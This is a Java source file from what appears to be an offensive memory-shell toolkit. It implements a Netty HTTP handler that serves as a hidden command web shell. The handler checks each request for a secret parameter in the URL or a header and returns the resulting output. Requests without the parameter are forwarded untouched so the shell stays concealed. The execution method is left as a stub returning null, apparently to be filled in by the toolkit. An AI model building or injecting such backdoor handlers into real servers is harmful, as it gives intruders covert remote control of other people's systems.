package com.reajason.javaweb.memshell.shelltool.command;

import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.*;

import java.io.InputStream;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

/**
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class CommandNettyHandler extends ChannelDuplexHandler {
    public static String paramName;

    @Override
    @SuppressWarnings("all")
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            HttpRequest request = (HttpRequest) msg;
            HttpHeaders headers = request.headers();
            String p = getParamFromUrl(request.uri(), paramName);
            if (p == null || p.isEmpty()) {
                p = headers.get(paramName);
            }
            if (p == null) {
                ctx.fireChannelRead(msg);
                return;
            }
            String result = "";
            try {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                result = new Scanner(inputStream).useDelimiter("\\A").next();
            } catch (Throwable e) {
                e.printStackTrace();
            }
            send(ctx, result.toString());
            return;
        }
        ctx.fireChannelRead(msg);
    }

    private void send(ChannelHandlerContext ctx, String context) throws Exception {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(context, StandardCharsets.UTF_8));
        response.headers().set("Content-Type", "text/plain; charset=UTF-8");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    public String getParamFromUrl(String requestUrl, String paramName) throws Exception {
        URI uri = new URI(requestUrl);
        String query = uri.getQuery();
        if (query == null) {
            return null;
        }
        String[] kvs = query.split("&");
        for (String kv : kvs) {
            String k = null;
            String[] pair = kv.split("=", 2);
            if (pair.length > 0) {
                k = pair[0];
            }
            if (pair.length > 1 && k != null && k.equals(paramName)) {
                return pair[1];
            }
        }
        return null;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}